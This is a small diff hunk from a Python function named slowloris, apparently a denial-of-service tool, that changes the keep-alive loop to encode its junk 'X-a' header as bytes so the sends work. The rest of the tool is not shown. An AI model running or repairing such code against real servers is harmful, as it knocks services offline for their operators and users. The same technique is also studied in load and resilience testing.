@@ -60,7 +60,7 @@ def slowloris(IP, port, socket_count):
             
             for s in sockets:
                 try:
-                    s.send(f"X-a {random.randint(1,255)}\r\n")
+                    s.send(f"X-a {random.randint(1,255)}\r\n".encode())
                 except Exception as e:
                     sockets.remove(s)
                     print(f"socket removed: {e}")
